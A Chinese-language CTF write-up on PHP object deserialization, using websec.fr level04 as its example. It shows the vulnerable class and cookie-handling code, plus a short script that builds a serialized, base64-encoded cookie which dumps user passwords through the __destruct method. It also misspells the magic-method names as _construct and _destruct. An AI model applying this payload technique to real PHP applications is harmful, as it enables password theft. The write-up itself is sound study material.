## 反序列化漏洞注意事项

序列化漏洞的本质是将一个对象进行序列化，然后当php后端在反序列化这个对象时会创建这个对象，从而调用魔法函数自动执行这个对象中的某些恶意命令，例如

```php
_construct()、_destruct()这两个魔法函数，会在生成对象和对象销毁时自动调用，从而执行其中输入的恶意命令
```

例子：取自于http://www.websec.fr/#中的level04

```php
<?php

class SQL {
    public $query = '';
    public $conn;
    public function __construct() {
    }
    
    public function connect() {
        $this->conn = new SQLite3 ("database.db", SQLITE3_OPEN_READONLY);
    }

    public function SQL_query($query) {
        $this->query = $query;
    }

    public function execute() {
        return $this->conn->query ($this->query);
    }

    public function __destruct() {  //在SQL对象销毁时自动执行
        if (!isset ($this->conn)) {
            $this->connect ();
        }
        
        $ret = $this->execute ();
        if (false !== $ret) {    
            while (false !== ($row = $ret->fetchArray (SQLITE3_ASSOC))) {
                echo '<p class="well"><strong>Username:<strong> ' . $row['username'] . '</p>';
            }
        }
    }
}
?>
```

destruct在SQL对象销毁时自动进行，因此其中的代码会被执行，只要使得$query的内容是SQL恶意注入命令，该命令即在destruct执行时在SQL中执行，从而获得用户密码。

接下来是cookie部分的php代码，展示了存在cookie反序列化的安全问题，因此才可以传入一个恶意序列化值，使得在反序列化以后创建上边代码中的SQL对象，从而调用destruct()。

```php
?php
include 'connect.php';

$sql = new SQL();
$sql->connect();
$sql->query = 'SELECT username FROM users WHERE id=';


if (isset ($_COOKIE['leet_hax0r'])) {
    $sess_data = unserialize (base64_decode ($_COOKIE['leet_hax0r']));   //恶意序列化值作为cookie会在此被序列化，从而创建SQL对象，执行destuct()
    try {
        if (is_array($sess_data) && $sess_data['ip'] != $_SERVER['REMOTE_ADDR']) {
            die('CANT HACK US!!!');
        }
    } catch(Exception $e) {
        echo $e;
    }
} else {
    $cookie = base64_encode (serialize (array ( 'ip' => $_SERVER['REMOTE_ADDR']))) ;
    setcookie ('leet_hax0r', $cookie, time () + (86400 * 30));
}

if (isset ($_REQUEST['id']) && is_numeric ($_REQUEST['id'])) {
    try {
        $sql->query .= $_REQUEST['id'];
    } catch(Exception $e) {
        echo ' Invalid query';
    }
}
?>
```

因此要作为cookie输入的值利用一下代码生成：

```php
<?php
class SQL {
    public $query = 'select password as username from users';
    public $conn;

}
$a=new SQL();
echo base64_encode(serialize($a));
?>
//创建一个$query值为'select password as username from users'，然后创建实例，进行序列化以后base64编码，得到的值即为作为cookie注入的恶意值
```